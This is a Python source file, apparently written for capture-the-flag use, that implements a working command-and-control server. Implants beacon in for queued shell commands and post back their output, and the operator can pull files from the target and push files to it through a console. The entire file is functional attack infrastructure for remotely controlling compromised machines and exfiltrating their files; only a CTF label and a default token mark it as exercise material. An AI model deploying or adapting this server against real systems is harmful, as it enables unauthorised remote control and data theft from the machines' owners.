#!/usr/bin/env python3
"""
CTF C2 Server
=============
Run on your machine:
    python c2_server.py [port]          # default port 8080
    C2_TOKEN=mysecret python c2_server.py 8080

Console commands:
    <any shell command>                 # run on target
    get <remote_path>                   # pull file from target to ./c2_uploads/
    put <local_path>                    # push file from ./c2_files/ to target
    sessions                            # show beacon history
    help                                # show this list

Requires: pip install flask
"""

import os, sys, queue, threading, time, json
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, jsonify, send_from_directory, abort
except ImportError:
    sys.exit("[!] Flask not found — install it: pip install flask")

# ── Config ────────────────────────────────────────────────────────────────────
TOKEN      = os.environ.get("C2_TOKEN", "ctf-token-changeme")
UPLOAD_DIR = Path("./c2_uploads")   # files received FROM the target
FILE_DIR   = Path("./c2_files")     # files you want to SEND to the target
PORT       = int(sys.argv[1]) if len(sys.argv) > 1 else 8080

UPLOAD_DIR.mkdir(exist_ok=True)
FILE_DIR.mkdir(exist_ok=True)

# ── State ─────────────────────────────────────────────────────────────────────
_cmd_queue   = queue.Queue()        # commands waiting to be picked up by agent
_results     = []                   # (timestamp, cmd, output) tuples
_sessions    = []                   # beacon check-ins (ip, ts)
_state_lock  = threading.Lock()

# ── Flask app ─────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.logger.disabled = True

def _auth():
    if request.headers.get("X-Token") != TOKEN:
        abort(403)


@app.route("/beacon", methods=["GET"])
def beacon():
    """Agent polls here for pending commands."""
    _auth()
    ip = request.remote_addr
    ts = datetime.now().strftime("%H:%M:%S")
    with _state_lock:
        _sessions.append((ip, ts))
    try:
        cmd = _cmd_queue.get_nowait()
    except queue.Empty:
        cmd = ""
    return jsonify({"cmd": cmd})


@app.route("/result", methods=["POST"])
def result():
    """Agent posts command output here."""
    _auth()
    data    = request.get_json(silent=True) or {}
    cmd     = data.get("cmd", "")
    output  = data.get("output", "")
    ts      = datetime.now().strftime("%H:%M:%S")
    with _state_lock:
        _results.append((ts, cmd, output))
    # Print immediately to the console
    _print_result(ts, cmd, output)
    return "OK"


@app.route("/file/<path:filename>", methods=["GET"])
def serve_file(filename):
    """Agent downloads a file from FILE_DIR."""
    _auth()
    abs_dir = FILE_DIR.resolve()
    return send_from_directory(str(abs_dir), filename)


@app.route("/upload", methods=["POST"])
def upload():
    """Agent uploads a file here."""
    _auth()
    fname = os.path.basename(request.headers.get("X-Filename", f"upload_{int(time.time())}.bin"))
    dest  = UPLOAD_DIR / fname
    dest.write_bytes(request.data)
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n[{ts}] [upload] {fname}  ({len(request.data):,} bytes) → {dest}")
    _prompt()
    return "OK"


# ── Console ───────────────────────────────────────────────────────────────────
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
RED    = "\033[31m"

def _prompt():
    print(f"\n{BOLD}{GREEN}c2>{RESET} ", end="", flush=True)

def _print_result(ts, cmd, output):
    print(f"\n{CYAN}[{ts}] $ {cmd}{RESET}")
    print(output.rstrip() if output.strip() else "(no output)")
    _prompt()

def _console():
    print(f"\n{BOLD}CTF C2 Server{RESET}")
    print(f"  Token  : {YELLOW}{TOKEN}{RESET}")
    print(f"  Port   : {PORT}")
    print(f"  Files  : {FILE_DIR.resolve()}  (put files here to push to target)")
    print(f"  Uploads: {UPLOAD_DIR.resolve()}  (files pulled from target land here)")
    print(f"\n  Type 'help' for command list\n")

    HELP = (
        "  <command>          run shell command on target\n"
        "  get <remote_path>  pull file from target  → ./c2_uploads/\n"
        "  put <filename>     push ./c2_files/<filename> → target cwd\n"
        "  sessions           show recent beacon check-ins\n"
        "  results            show last 10 command results\n"
        "  help               show this help\n"
        "  exit               shut down server\n"
    )

    while True:
        _prompt()
        try:
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down")
            os._exit(0)

        if not line:
            continue

        if line == "help":
            print(HELP)

        elif line == "exit":
            print("[*] Shutting down")
            os._exit(0)

        elif line == "sessions":
            with _state_lock:
                s = list(_sessions[-20:])
            if not s:
                print("  No beacons yet")
            else:
                for ip, ts in s:
                    print(f"  [{ts}]  {ip}")

        elif line == "results":
            with _state_lock:
                r = list(_results[-10:])
            if not r:
                print("  No results yet")
            else:
                for ts, cmd, out in r:
                    print(f"\n{CYAN}[{ts}] $ {cmd}{RESET}")
                    print(out.rstrip() or "(no output)")

        elif line.startswith("get "):
            # Queue a special agent-side upload command
            remote = line[4:].strip()
            if not remote:
                print("[!] Usage: get <remote_path>")
                continue
            _cmd_queue.put(f"#get {remote}")
            print(f"[*] Queued: pull '{remote}' from target")

        elif line.startswith("put "):
            # Agent will download from /file/<filename>
            fname = line[4:].strip()
            if not fname:
                print("[!] Usage: put <filename>  (file must be in ./c2_files/)")
                continue
            if not (FILE_DIR / fname).exists():
                print(f"[!] {FILE_DIR / fname} not found")
                continue
            _cmd_queue.put(f"#put {fname}")
            print(f"[*] Queued: push '{fname}' to target")

        else:
            # Regular shell command
            _cmd_queue.put(line)
            print(f"[*] Queued: {line!r}")


if __name__ == "__main__":
    # Flask in background, console in main thread
    flask_thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True,
    )
    flask_thread.start()
    time.sleep(0.5)   # let Flask bind before printing banner
    _console()
